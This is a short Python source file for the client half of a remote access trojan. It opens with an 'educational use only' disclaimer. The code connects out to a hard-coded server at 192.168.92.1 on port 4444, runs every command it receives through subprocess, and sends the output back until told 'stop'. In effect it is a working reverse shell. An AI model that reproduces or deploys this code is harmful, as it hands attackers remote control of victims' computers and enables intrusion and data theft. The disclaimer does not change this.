#This project is solely for educational use. The author does not authorize
#the use of this project for any malicious or illegal actions.

import socket
import subprocess

#create socket object

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#RATServer should be set to the IP of the RAT server
RATServer = "192.168.92.1"
RATPort = 4444

#Start the connection to the RAT server
s.connect((RATServer, RATPort))
print("Successfully connected to server")

while True:
    try:
        #get the instruction from the RAT server and execute it
        command = s.recv(4096)
        command = command.decode("UTF-8")

        #exit the session if the RAT server enters "quit"
        if command == "stop":
            print("Exiting connection...")
            break

        output = subprocess.getoutput(command)
        output = output.encode("UTF-8")

        s.send(output)

        #clear the output variable
        output = ""
    except Exception as e:
        print("The following exception has occurred: ", e)